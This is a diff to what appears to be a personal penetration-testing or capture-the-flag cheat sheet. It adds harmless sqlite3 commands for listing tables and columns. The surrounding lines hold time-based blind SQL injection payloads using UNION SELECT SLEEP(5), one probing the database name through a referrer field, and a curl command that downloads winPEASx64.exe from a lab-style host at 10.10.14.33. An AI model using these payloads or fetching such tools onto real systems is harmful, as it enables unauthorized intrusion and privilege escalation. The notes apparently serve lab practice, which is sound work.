@@ -114,6 +114,12 @@ admin123' UNION SELECT SLEEP(5);--
 admin123' UNION SELECT SLEEP(5),2;--
 referrer=admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--
 
+~~~~~~~~~~~~~~~~~~~~~~~~~~~        sqlite3     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+sqlite3 <dbname.db\link>
+.tables                                                                            # Tables list
+pragma table_info(<table_name>);                                                   # Headers of the table
+
+
 ####################################################################################
 
 curl -O http://10.10.14.33:8081/winPEASx64.exe <-UseBasicParsing>                  # Download file by curl
